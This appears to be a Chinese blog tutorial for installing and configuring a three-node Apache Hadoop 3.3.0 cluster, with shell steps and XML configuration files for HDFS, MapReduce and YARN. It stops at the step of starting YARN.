<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">1. 下载</span></span><br><span class="line">wget http://archive.apache.org/dist/hadoop/common/hadoop-3.3.0/hadoop-3.3.0.tar.gz</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">2. 解压</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">请确保目录/export/server存在</span></span><br><span class="line">tar -zxvf hadoop-3.3.0.tar.gz -C /export/server/</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">3. 构建软链接</span></span><br><span class="line">ln -s /export/server/hadoop-3.3.0 /export/server/hadoop</span><br></pre></td></tr></table></figure>

<ul>
<li>修改配置文件：hadoop-env.sh</li>
</ul>
<blockquote>
<p>Hadoop的配置文件要修改的地方很多，请细心<br>cd 进入到&#x2F;export&#x2F;server&#x2F;hadoop&#x2F;etc&#x2F;hadoop，文件夹中，配置文件都在这里</p>
</blockquote>
<p>修改hadoop-env.sh文件</p>
<blockquote>
<p>此文件是配置一些Hadoop用到的环境变量</p>
</blockquote>
<p>这些是临时变量，在Hadoop运行时有用</p>
<p>如果要永久生效，需要写到&#x2F;etc&#x2F;profile中</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在文件开头加入：</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">配置Java安装路径</span></span><br><span class="line">export JAVA_HOME=/export/server/jdk</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">配置Hadoop安装路径</span></span><br><span class="line">export HADOOP_HOME=/export/server/hadoop</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Hadoop hdfs配置文件路径</span></span><br><span class="line">export HADOOP_CONF_DIR=$HADOOP_HOME/etc/hadoop</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Hadoop YARN配置文件路径</span></span><br><span class="line">export YARN_CONF_DIR=$HADOOP_HOME/etc/hadoop</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Hadoop YARN 日志文件夹</span></span><br><span class="line">export YARN_LOG_DIR=$HADOOP_HOME/logs/yarn</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Hadoop hdfs 日志文件夹</span></span><br><span class="line">export HADOOP_LOG_DIR=$HADOOP_HOME/logs/hdfs</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Hadoop的使用启动用户配置</span></span><br><span class="line">export HDFS_NAMENODE_USER=root</span><br><span class="line">export HDFS_DATANODE_USER=root</span><br><span class="line">export HDFS_SECONDARYNAMENODE_USER=root</span><br><span class="line">export YARN_RESOURCEMANAGER_USER=root</span><br><span class="line">export YARN_NODEMANAGER_USER=root</span><br><span class="line">export YARN_PROXYSERVER_USER=root</span><br></pre></td></tr></table></figure>

<ul>
<li>修改配置文件：core-site.xml</li>
</ul>
<p>如下，清空文件，填入如下内容</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml-stylesheet type=<span class="string">&quot;text/xsl&quot;</span> href=<span class="string">&quot;configuration.xsl&quot;</span>?&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">  Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);</span></span><br><span class="line"><span class="comment">  you may not use this file except in compliance with the License.</span></span><br><span class="line"><span class="comment">  You may obtain a copy of the License at</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    http://www.apache.org/licenses/LICENSE-2.0</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  Unless required by applicable law or agreed to in writing, software</span></span><br><span class="line"><span class="comment">  distributed under the License is distributed on an &quot;AS IS&quot; BASIS,</span></span><br><span class="line"><span class="comment">  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.</span></span><br><span class="line"><span class="comment">  See the License for the specific language governing permissions and</span></span><br><span class="line"><span class="comment">  limitations under the License. See accompanying LICENSE file.</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- Put site-specific property overrides in this file. --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>fs.defaultFS<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>hdfs://node1:8020<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span><span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>io.file.buffer.size<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>131072<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span><span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>


<ul>
<li>配置：hdfs-site.xml文件</li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml-stylesheet type=<span class="string">&quot;text/xsl&quot;</span> href=<span class="string">&quot;configuration.xsl&quot;</span>?&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">  Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);</span></span><br><span class="line"><span class="comment">  you may not use this file except in compliance with the License.</span></span><br><span class="line"><span class="comment">  You may obtain a copy of the License at</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    http://www.apache.org/licenses/LICENSE-2.0</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  Unless required by applicable law or agreed to in writing, software</span></span><br><span class="line"><span class="comment">  distributed under the License is distributed on an &quot;AS IS&quot; BASIS,</span></span><br><span class="line"><span class="comment">  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.</span></span><br><span class="line"><span class="comment">  See the License for the specific language governing permissions and</span></span><br><span class="line"><span class="comment">  limitations under the License. See accompanying LICENSE file.</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- Put site-specific property overrides in this file. --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.datanode.data.dir.perm<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>700<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.namenode.name.dir<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>/data/nn<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span>Path on the local filesystem where the NameNode stores the namespace and transactions logs persistently.<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.namenode.hosts<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>node1,node2,node3<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span>List of permitted DataNodes.<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.blocksize<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>268435456<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span><span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.namenode.handler.count<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>100<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span><span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.datanode.data.dir<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>/data/dn<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>配置：mapred-env.sh文件</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在文件的开头加入如下环境变量设置</span></span><br><span class="line">export JAVA_HOME=/export/server/jdk</span><br><span class="line">export HADOOP_JOB_HISTORYSERVER_HEAPSIZE=1000</span><br><span class="line">export HADOOP_MAPRED_ROOT_LOGGER=INFO,RFA</span><br></pre></td></tr></table></figure>

<ul>
<li>配置：mapred-site.xml文件</li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml-stylesheet type=<span class="string">&quot;text/xsl&quot;</span> href=<span class="string">&quot;configuration.xsl&quot;</span>?&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">  Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);</span></span><br><span class="line"><span class="comment">  you may not use this file except in compliance with the License.</span></span><br><span class="line"><span class="comment">  You may obtain a copy of the License at</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    http://www.apache.org/licenses/LICENSE-2.0</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  Unless required by applicable law or agreed to in writing, software</span></span><br><span class="line"><span class="comment">  distributed under the License is distributed on an &quot;AS IS&quot; BASIS,</span></span><br><span class="line"><span class="comment">  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.</span></span><br><span class="line"><span class="comment">  See the License for the specific language governing permissions and</span></span><br><span class="line"><span class="comment">  limitations under the License. See accompanying LICENSE file.</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- Put site-specific property overrides in this file. --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>mapreduce.framework.name<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>yarn<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span><span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>mapreduce.jobhistory.address<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>node1:10020<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span><span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>mapreduce.jobhistory.webapp.address<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>node1:19888<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span><span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>mapreduce.jobhistory.intermediate-done-dir<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>/data/mr-history/tmp<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span><span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>mapreduce.jobhistory.done-dir<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>/data/mr-history/done<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span><span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.app.mapreduce.am.env<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>HADOOP_MAPRED_HOME=$HADOOP_HOME<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>mapreduce.map.env<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>HADOOP_MAPRED_HOME=$HADOOP_HOME<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>mapreduce.reduce.env<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>HADOOP_MAPRED_HOME=$HADOOP_HOME<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>


<ul>
<li>配置：yarn-env.sh文件</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在文件的开头加入如下环境变量设置</span></span><br><span class="line">export JAVA_HOME=/export/server/jdk</span><br><span class="line">export HADOOP_HOME=/export/server/hadoop</span><br><span class="line">export HADOOP_CONF_DIR=$HADOOP_HOME/etc/hadoop</span><br><span class="line">export YARN_CONF_DIR=$HADOOP_HOME/etc/hadoop</span><br><span class="line">export YARN_LOG_DIR=$HADOOP_HOME/logs/yarn</span><br><span class="line">export HADOOP_LOG_DIR=$HADOOP_HOME/logs/hdfs</span><br></pre></td></tr></table></figure>

<ul>
<li>配置：yarn-site.xml文件</li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">  Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);</span></span><br><span class="line"><span class="comment">  you may not use this file except in compliance with the License.</span></span><br><span class="line"><span class="comment">  You may obtain a copy of the License at</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    http://www.apache.org/licenses/LICENSE-2.0</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  Unless required by applicable law or agreed to in writing, software</span></span><br><span class="line"><span class="comment">  distributed under the License is distributed on an &quot;AS IS&quot; BASIS,</span></span><br><span class="line"><span class="comment">  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.</span></span><br><span class="line"><span class="comment">  See the License for the specific language governing permissions and</span></span><br><span class="line"><span class="comment">  limitations under the License. See accompanying LICENSE file.</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- Site specific YARN configuration properties --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.log.server.url<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>http://node1:19888/jobhistory/logs<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span><span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.web-proxy.address<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>node1:8089<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span>proxy server hostname and port<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.log-aggregation-enable<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>true<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span>Configuration to enable or disable log aggregation<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.nodemanager.remote-app-log-dir<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>/tmp/logs<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span>Configuration to enable or disable log aggregation<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- Site specific YARN configuration properties --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.resourcemanager.hostname<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>node1<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span><span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.resourcemanager.scheduler.class<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>org.apache.hadoop.yarn.server.resourcemanager.scheduler.fair.FairScheduler<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span><span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.nodemanager.local-dirs<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>/data/nm-local<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span>Comma-separated list of paths on the local filesystem where intermediate data is written.<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.nodemanager.log-dirs<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>/data/nm-log<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span>Comma-separated list of paths on the local filesystem where logs are written.<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.nodemanager.log.retain-seconds<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>10800<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span>Default time (in seconds) to retain log files on the NodeManager Only applicable if log-aggregation is disabled.<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.nodemanager.aux-services<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>mapreduce_shuffle<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span>Shuffle service that needs to be set for Map Reduce applications.<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>修改wokers文件</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">全部内容如下</span></span><br><span class="line">node1</span><br><span class="line">node2</span><br><span class="line">node3</span><br></pre></td></tr></table></figure>

<ul>
<li>分发hadoop到其它机器</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在node1执行</span></span><br><span class="line">cd /export/server</span><br><span class="line"></span><br><span class="line">scp -r hadoop-3.3.0 node2:`pwd`/</span><br><span class="line">scp -r hadoop-3.3.0 node2:`pwd`/</span><br></pre></td></tr></table></figure>

<ul>
<li>在node2、node3执行</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建软链接</span></span><br><span class="line">ln -s /export/server/hadoop-3.3.0 /export/server/hadoop</span><br></pre></td></tr></table></figure>

<ul>
<li>创建所需目录</li>
</ul>
<p>在node1执行：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir -p /data/nn</span><br><span class="line">mkdir -p /data/dn</span><br><span class="line">mkdir -p /data/nm-log</span><br><span class="line">mkdir -p /data/nm-local</span><br></pre></td></tr></table></figure>

<p>在node2执行：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir -p /data/dn</span><br><span class="line">mkdir -p /data/nm-log</span><br><span class="line">mkdir -p /data/nm-local</span><br></pre></td></tr></table></figure>

<p>在node3执行：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir -p /data/dn</span><br><span class="line">mkdir -p /data/nm-log</span><br><span class="line">mkdir -p /data/nm-local</span><br></pre></td></tr></table></figure>

<ul>
<li>配置环境变量<br>在node1、node2、node3修改&#x2F;etc&#x2F;profile</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">export HADOOP_HOME=/export/server/hadoop</span><br><span class="line">export PATH=$PATH:$HADOOP_HOME/bin:$HADOOP_HOME/sbin</span><br></pre></td></tr></table></figure>

<p>执行source &#x2F;etc&#x2F;profile生效</p>
<ul>
<li>格式化NameNode，在node1执行</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hadoop namenode -format</span><br></pre></td></tr></table></figure>

<blockquote>
<p>hadoop这个命令来自于：$HADOOP_HOME&#x2F;bin中的程序</p>
</blockquote>
<p>由于配置了环境变量PATH，所以可以在任意位置执行hadoop命令哦</p>
<ul>
<li>启动hadoop的hdfs集群，在node1执行即可</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">start-dfs.sh</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">如需停止可以执行</span></span><br><span class="line">stop-dfs.sh</span><br></pre></td></tr></table></figure>

<blockquote>
<p>start-dfs.sh这个命令来自于：$HADOOP_HOME&#x2F;sbin中的程序</p>
</blockquote>
<p>由于配置了环境变量PATH，所以可以在任意位置执行start-dfs.sh命令哦</p>
<ul>
<li>启动hadoop的yarn集群，在node1执行即可</li>
</ul>
